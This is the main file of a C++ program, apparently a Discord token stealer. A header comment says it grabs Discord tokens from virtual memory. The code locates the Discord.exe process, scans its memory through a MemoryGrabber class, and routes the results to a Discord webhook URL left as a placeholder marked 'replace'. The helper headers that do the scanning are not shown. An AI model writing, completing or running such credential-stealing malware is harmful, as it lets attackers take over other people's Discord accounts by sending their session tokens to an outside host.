// --- grabs discord tokens in virtual memory ---
// deps: libcurlx64 & nlohmannn::json
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <vector>
#include <regex>
#include <thread>
#include <cstdio>
#include <locale>
#include <codecvt>
#include <mutex>

#include <Windows.h>  // windows api
#include <winternl.h>
#include <TlHelp32.h>


#include <curl/curl.h>
#include <nlohmann/json.hpp>
// project inclusions
#include "include/webhooks.hpp"
#include "include/tokens.hpp"

// replace
std::string webhook_url = "https://discordapp.com/api/webhooks/";



int main()
{ // proof of concept
    std::wstring   process    = L"Discord.exe";
    MemoryGrabber* mem_grabbr = (new MemoryGrabber(process, webhook_url))->get_process_by_name()->scan_process();
    // free memory
    delete mem_grabbr->webhook;
    delete mem_grabbr;
}
